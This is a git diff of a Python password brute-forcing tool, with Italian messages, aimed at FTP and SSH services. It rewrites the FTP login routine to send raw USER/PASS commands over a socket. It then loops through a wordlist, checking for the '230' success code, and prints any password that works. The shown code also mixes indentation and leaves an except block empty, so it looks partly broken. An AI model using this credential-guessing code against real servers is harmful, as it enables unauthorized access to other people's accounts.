@@ -14,18 +14,18 @@ input_file = ''
 paramiko.util.log_to_file("chiedonocomeva.log")
 code = 0
 
-def ftp_login(host, username, password):
-    try:
-        ftp = FTP(host)
-        ftp.login(username, password)
-        ftp.quit()
-        print "+++++++++++++++++++++++"
-        print "[*] Utente : {}".format(username)
-        print "[*] Password : {}".format(password)
-        print "+++++++++++++++++++++++"
-        sys.exit(0)
-    except:
-            pass
+def ftp_login(username , password):
+	s = socket(AF_INET, SOCK_STREAM)
+	print('[*] Provando con Utente: %s Password: %s' % (username, password))
+	s.connect((host,21))
+	data = s.recv(1024)
+	s.send('USER '+ username + '\r\n')
+	data = s.recv(1024)
+	s.send('PASS ' + password + '\r\n')
+	data = s.recv (3)
+	s.send('QUIT\r\n')
+	s.close()
+	return data 
 def ssh_connect(password, code = 0):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -136,8 +136,11 @@ if ftpAperto == True:
             for i in input_file.readlines():
                 password = i.strip('\n')
                 try:
-                    #i was younger then, take me back to when
-                    ftp_login(host, password)
+                	#i was younger then, take me back to when
+                	almenociprovolol = ftp_login(username, password)
+			if almenociprovolol == '230':
+				print('[*] Password ==> '+ password)
+				sys.exit(0)
                 except:
 
     elif ftp_lower is 'n':
